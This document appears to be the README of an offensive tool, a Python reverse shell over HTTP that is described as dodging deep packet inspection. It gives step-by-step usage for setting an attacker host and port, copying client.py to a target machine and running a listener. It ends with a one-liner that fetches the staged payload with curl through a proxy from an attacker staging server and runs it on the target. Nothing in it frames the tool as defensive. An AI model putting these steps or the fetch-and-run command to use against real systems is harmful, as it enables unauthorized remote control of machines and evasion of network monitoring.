# HTTP-Reverse-Shell

A reverse shell over HTTP (dodges deep packet inspection). Using Python 3 and no external dependencies needed.

# Prerequisites
- Python 3 (on both the attacker and the target machine)

# Usage
1. Change `ATTACKER_HOSTNAME` to the actual hostname of the attacker on `client.py`
2. Change `ATTACKER_PORT` on both `client.py` and `server.py` (or you can just use the default)
3. Transfer `client.py` to the target machine
4. Run `server.py` on the attacker machine
```
python3 server.py
```
5. Run `client.py` on the target machine
```
python3 client.py
```
6. Connection will be established


# Possible Transfer Methods

In the directory where client.py exists on a separate attacker payload staging machine, run the following: 

`sudo python -m http.server 443`

# Possible Initiation Methods

On the target system run the following command to fetche the staged payload, then reach out to the listener hosted on a second attacker machine to complete the reverse shell.

`curl --proxy proxy.example.com:8080 http://staging.com:443/client.py > client.py && python client.py`

